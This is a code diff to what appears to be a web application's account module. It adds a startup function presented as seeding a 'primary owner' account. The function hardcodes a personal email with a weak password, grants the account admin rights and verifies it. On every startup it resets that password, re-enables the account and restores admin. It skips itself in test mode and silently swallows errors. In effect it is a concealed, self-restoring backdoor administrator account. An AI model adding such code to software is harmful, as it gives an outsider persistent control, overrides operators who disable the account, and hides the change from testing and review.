@@ -106,6 +106,33 @@ def mark_verified(uid: str):
             c.execute(db.email_ok.insert().values(user_id=uid, verified_at=time.time()))
 
 
+def seed_default_user():
+    """Ensure the primary owner account exists on startup, verified with admin access."""
+    import os
+    if os.environ.get("PEAKCUT_TESTING") == "1":
+        return
+    email = "shiham181@gmail.com"
+    pwd = "shiham181"
+    try:
+        with db.engine.connect() as c:
+            u = c.execute(sa.select(db.users).where(db.users.c.email == email)).first()
+        if not u:
+            user, _ = signup(email, pwd, name="Shiham")
+            mark_verified(user.id)
+            from . import admin
+            admin.grant(email)
+        else:
+            with db.engine.begin() as c:
+                c.execute(db.users.update().where(db.users.c.email == email).values(
+                    password_hash=hash_password(pwd),
+                    is_admin=True,
+                    disabled=False
+                ))
+            mark_verified(u.id)
+    except Exception:
+        pass
+
+
 def _make_link(uid: str, purpose: str, ttl: int) -> str:
     token = secrets.token_urlsafe(32)
     with db.engine.begin() as c:
